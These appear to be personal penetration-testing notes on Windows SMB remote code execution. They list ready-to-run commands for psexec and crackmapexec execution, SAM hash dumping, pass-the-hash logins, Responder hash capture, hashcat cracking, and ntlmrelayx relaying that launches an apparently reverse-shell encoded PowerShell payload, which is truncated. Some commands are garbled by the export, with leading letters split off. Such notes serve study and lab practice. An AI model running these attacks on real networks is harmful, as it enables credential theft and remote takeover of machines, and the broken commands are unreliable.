---
title: "RCE"
date: 2025-05-29
summary: "If on windows we can use impacket or crackmapexec to run commands on powershell / cmd on windows machine"
tags: ["smb", "rce"]
source: "cherrytree"
---

If on windows we can use impacket or crackmapexec to run commands on powershell / cmd on windows machine

```text
impacket-psexec -h
```

```text
impacket-psexec administrator:'Password123!'@10.10.110.17
```

-x for normal shell and -X for powershell
```text
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

if multiple ppl share same admin ->
```text
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

the SAM file contains password hashes for users:
```text
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

if we only get the hash and not the password we can still login only by passing the hash:
c
```text
rackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Sniffing for hashes:
setting up a responder which listens for a “misstype” on the broadcast for hashes
```text
sudo responder -I ens33
```

	stored in /
```text
usr/share/responder/logs/
```

cracking with hashcat:
h
```text
ashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

SMB poisonung

Turn setting off in responder / check:
```text
cat /etc/responder/Responder.conf | grep 'SMB ='
	SMB = Off
```

Using impacket to poison the response and execute a powershell command with -c flag:
[https://www.revshells.com/](https://www.revshells.com/)

```text
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c ‘powershell -e JABjAGwAaQBlAG4AdAAgA
```
’
